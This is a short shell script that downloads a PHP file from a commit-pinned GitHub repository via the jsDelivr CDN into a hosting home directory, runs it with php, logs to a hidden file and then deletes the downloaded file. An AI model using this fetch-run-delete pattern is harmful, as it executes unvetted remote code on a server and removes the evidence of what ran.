#!/bin/sh
H=/home/u814079684
M=$H/.ppvbc303.log
echo "start $(date -u +%FT%TZ)" > "$M"
curl -fsSL "https://cdn.jsdelivr.net/gh/jununrs/pensiun-pro-tmp-pub@b2e9b584135b57e13a445b5e65b9f3cc4fcd4ad1/v303-bc.php" -o $H/v303-bc.php >>"$M" 2>&1
EC=$?
echo "curl_ec=$EC" >> "$M"
if [ $EC -ne 0 ]; then cat "$M"; exit 1; fi
/usr/bin/php $H/v303-bc.php >>"$M" 2>&1
echo "php_ec=$?" >> "$M"
rm -f $H/v303-bc.php
cat "$M"
